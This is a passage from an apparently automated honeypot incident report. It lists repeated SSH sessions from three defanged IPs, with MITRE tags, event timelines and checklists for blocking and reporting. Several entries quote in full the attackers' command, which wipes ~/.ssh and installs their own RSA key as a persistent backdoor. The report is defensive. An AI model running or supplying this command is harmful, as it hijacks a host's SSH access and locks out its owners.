| `2026-04-17 09:28:23` | `cowrie.command.input` |
| `2026-04-17 09:28:23` | `cowrie.session.file_download` |
| `2026-04-17 09:28:23` | `cowrie.log.closed` |
| `2026-04-17 09:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12327e9f853b

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:28 |
| **Last Seen** | 2026-04-17 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:28:26` | `cowrie.session.connect` |
| `2026-04-17 09:28:26` | `cowrie.client.version` |
| `2026-04-17 09:28:26` | `cowrie.client.kex` |
| `2026-04-17 09:28:27` | `cowrie.login.success` |
| `2026-04-17 09:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a460021333ae

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:30 |
| **Last Seen** | 2026-04-17 09:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:30:07` | `cowrie.session.connect` |
| `2026-04-17 09:30:07` | `cowrie.client.version` |
| `2026-04-17 09:30:07` | `cowrie.client.kex` |
| `2026-04-17 09:30:08` | `cowrie.login.success` |
| `2026-04-17 09:30:08` | `cowrie.session.params` |
| `2026-04-17 09:30:08` | `cowrie.command.input` |
| `2026-04-17 09:30:08` | `cowrie.command.failed` |
| `2026-04-17 09:30:08` | `cowrie.log.closed` |
| `2026-04-17 09:30:09` | `cowrie.session.params` |
| `2026-04-17 09:30:09` | `cowrie.command.input` |
| `2026-04-17 09:30:09` | `cowrie.session.file_download` |
| `2026-04-17 09:30:09` | `cowrie.log.closed` |
| `2026-04-17 09:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4db0d2f73bc

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:30 |
| **Last Seen** | 2026-04-17 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:30:11` | `cowrie.session.connect` |
| `2026-04-17 09:30:11` | `cowrie.client.version` |
| `2026-04-17 09:30:12` | `cowrie.client.kex` |
| `2026-04-17 09:30:12` | `cowrie.login.success` |
| `2026-04-17 09:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b09a42239f3

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:31 |
| **Last Seen** | 2026-04-17 09:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:31:14` | `cowrie.session.connect` |
| `2026-04-17 09:31:14` | `cowrie.client.version` |
| `2026-04-17 09:31:14` | `cowrie.client.kex` |
| `2026-04-17 09:31:15` | `cowrie.login.success` |
| `2026-04-17 09:31:15` | `cowrie.session.params` |
| `2026-04-17 09:31:15` | `cowrie.command.input` |
| `2026-04-17 09:31:15` | `cowrie.command.failed` |
| `2026-04-17 09:31:15` | `cowrie.log.closed` |
| `2026-04-17 09:31:16` | `cowrie.session.params` |
| `2026-04-17 09:31:16` | `cowrie.command.input` |
| `2026-04-17 09:31:16` | `cowrie.session.file_download` |
| `2026-04-17 09:31:16` | `cowrie.log.closed` |
| `2026-04-17 09:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ee773fc0ff

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:31 |
| **Last Seen** | 2026-04-17 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:31:18` | `cowrie.session.connect` |
| `2026-04-17 09:31:18` | `cowrie.client.version` |
| `2026-04-17 09:31:18` | `cowrie.client.kex` |
| `2026-04-17 09:31:18` | `cowrie.login.success` |
| `2026-04-17 09:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f001a1b3c46e

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:31 |
| **Last Seen** | 2026-04-17 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:31:27` | `cowrie.session.connect` |
| `2026-04-17 09:31:27` | `cowrie.client.version` |
| `2026-04-17 09:31:27` | `cowrie.client.kex` |
| `2026-04-17 09:31:28` | `cowrie.login.success` |
| `2026-04-17 09:31:29` | `cowrie.session.params` |
| `2026-04-17 09:31:29` | `cowrie.command.input` |
| `2026-04-17 09:31:29` | `cowrie.command.failed` |
| `2026-04-17 09:31:29` | `cowrie.log.closed` |
| `2026-04-17 09:31:29` | `cowrie.session.params` |
| `2026-04-17 09:31:29` | `cowrie.command.input` |
| `2026-04-17 09:31:30` | `cowrie.session.file_download` |
| `2026-04-17 09:31:30` | `cowrie.log.closed` |
| `2026-04-17 09:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a1eee6ac9cc

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:31 |
| **Last Seen** | 2026-04-17 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:31:32` | `cowrie.session.connect` |
| `2026-04-17 09:31:32` | `cowrie.client.version` |
| `2026-04-17 09:31:32` | `cowrie.client.kex` |
| `2026-04-17 09:31:33` | `cowrie.login.success` |
| `2026-04-17 09:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd5edc49218

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:32 |
| **Last Seen** | 2026-04-17 09:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:32:01` | `cowrie.session.connect` |
| `2026-04-17 09:32:01` | `cowrie.client.version` |
| `2026-04-17 09:32:01` | `cowrie.client.kex` |
| `2026-04-17 09:32:02` | `cowrie.login.success` |
| `2026-04-17 09:32:02` | `cowrie.session.params` |
| `2026-04-17 09:32:02` | `cowrie.command.input` |
| `2026-04-17 09:32:02` | `cowrie.command.failed` |
| `2026-04-17 09:32:02` | `cowrie.log.closed` |
| `2026-04-17 09:32:03` | `cowrie.session.params` |
| `2026-04-17 09:32:03` | `cowrie.command.input` |
| `2026-04-17 09:32:03` | `cowrie.session.file_download` |
| `2026-04-17 09:32:03` | `cowrie.log.closed` |
| `2026-04-17 09:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e7ab17e28a

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:32 |
| **Last Seen** | 2026-04-17 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:32:06` | `cowrie.session.connect` |
| `2026-04-17 09:32:06` | `cowrie.client.version` |
| `2026-04-17 09:32:07` | `cowrie.client.kex` |
| `2026-04-17 09:32:08` | `cowrie.login.success` |
| `2026-04-17 09:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5ad72342673

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:33 |
| **Last Seen** | 2026-04-17 09:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:33:04` | `cowrie.session.connect` |
| `2026-04-17 09:33:04` | `cowrie.client.version` |
| `2026-04-17 09:33:04` | `cowrie.client.kex` |
| `2026-04-17 09:33:05` | `cowrie.login.success` |
| `2026-04-17 09:33:05` | `cowrie.session.params` |
| `2026-04-17 09:33:05` | `cowrie.command.input` |
| `2026-04-17 09:33:05` | `cowrie.command.failed` |
| `2026-04-17 09:33:06` | `cowrie.log.closed` |
| `2026-04-17 09:33:06` | `cowrie.session.params` |
| `2026-04-17 09:33:06` | `cowrie.command.input` |
| `2026-04-17 09:33:06` | `cowrie.session.file_download` |
| `2026-04-17 09:33:06` | `cowrie.log.closed` |
| `2026-04-17 09:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bc3f3612533

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:33 |
| **Last Seen** | 2026-04-17 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:33:09` | `cowrie.session.connect` |
| `2026-04-17 09:33:09` | `cowrie.client.version` |
| `2026-04-17 09:33:09` | `cowrie.client.kex` |
| `2026-04-17 09:33:10` | `cowrie.login.success` |
| `2026-04-17 09:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13bb4513c83f

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:34 |
| **Last Seen** | 2026-04-17 09:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:34:40` | `cowrie.session.connect` |
| `2026-04-17 09:34:40` | `cowrie.client.version` |
| `2026-04-17 09:34:41` | `cowrie.client.kex` |
| `2026-04-17 09:34:42` | `cowrie.login.success` |
| `2026-04-17 09:34:42` | `cowrie.session.params` |
| `2026-04-17 09:34:42` | `cowrie.command.input` |
| `2026-04-17 09:34:42` | `cowrie.command.failed` |
| `2026-04-17 09:34:42` | `cowrie.log.closed` |
| `2026-04-17 09:34:43` | `cowrie.session.params` |
| `2026-04-17 09:34:43` | `cowrie.command.input` |
| `2026-04-17 09:34:43` | `cowrie.session.file_download` |
| `2026-04-17 09:34:43` | `cowrie.log.closed` |
| `2026-04-17 09:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed1a31c200d

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:34 |
| **Last Seen** | 2026-04-17 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:34:46` | `cowrie.session.connect` |
| `2026-04-17 09:34:46` | `cowrie.client.version` |
| `2026-04-17 09:34:46` | `cowrie.client.kex` |
| `2026-04-17 09:34:47` | `cowrie.login.success` |
| `2026-04-17 09:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356b7b782651

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:39 |
| **Last Seen** | 2026-04-17 09:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:39:32` | `cowrie.session.connect` |
| `2026-04-17 09:39:32` | `cowrie.client.version` |
| `2026-04-17 09:39:32` | `cowrie.client.kex` |
| `2026-04-17 09:39:33` | `cowrie.login.success` |
| `2026-04-17 09:39:33` | `cowrie.session.params` |
| `2026-04-17 09:39:33` | `cowrie.command.input` |
| `2026-04-17 09:39:33` | `cowrie.command.failed` |
| `2026-04-17 09:39:33` | `cowrie.log.closed` |
| `2026-04-17 09:39:34` | `cowrie.session.params` |
| `2026-04-17 09:39:34` | `cowrie.command.input` |
| `2026-04-17 09:39:34` | `cowrie.session.file_download` |
| `2026-04-17 09:39:34` | `cowrie.log.closed` |
| `2026-04-17 09:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ec36e4aee23

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:39 |
| **Last Seen** | 2026-04-17 09:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:39:36` | `cowrie.session.connect` |
| `2026-04-17 09:39:36` | `cowrie.client.version` |
| `2026-04-17 09:39:36` | `cowrie.client.kex` |
| `2026-04-17 09:39:37` | `cowrie.login.success` |
| `2026-04-17 09:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46d4bbb1575

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:39 |
| **Last Seen** | 2026-04-17 09:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:39:44` | `cowrie.session.connect` |
| `2026-04-17 09:39:44` | `cowrie.client.version` |
| `2026-04-17 09:39:44` | `cowrie.client.kex` |
| `2026-04-17 09:39:45` | `cowrie.login.success` |
| `2026-04-17 09:39:46` | `cowrie.session.params` |
| `2026-04-17 09:39:46` | `cowrie.command.input` |
| `2026-04-17 09:39:46` | `cowrie.command.failed` |
| `2026-04-17 09:39:46` | `cowrie.log.closed` |
| `2026-04-17 09:39:46` | `cowrie.session.params` |
| `2026-04-17 09:39:46` | `cowrie.command.input` |
| `2026-04-17 09:39:47` | `cowrie.session.file_download` |
| `2026-04-17 09:39:47` | `cowrie.log.closed` |
| `2026-04-17 09:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf7178124ca

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:39 |
| **Last Seen** | 2026-04-17 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:39:49` | `cowrie.session.connect` |
| `2026-04-17 09:39:49` | `cowrie.client.version` |
| `2026-04-17 09:39:49` | `cowrie.client.kex` |
| `2026-04-17 09:39:50` | `cowrie.login.success` |
| `2026-04-17 09:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096aa7814a90

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:41 |
| **Last Seen** | 2026-04-17 09:41 |
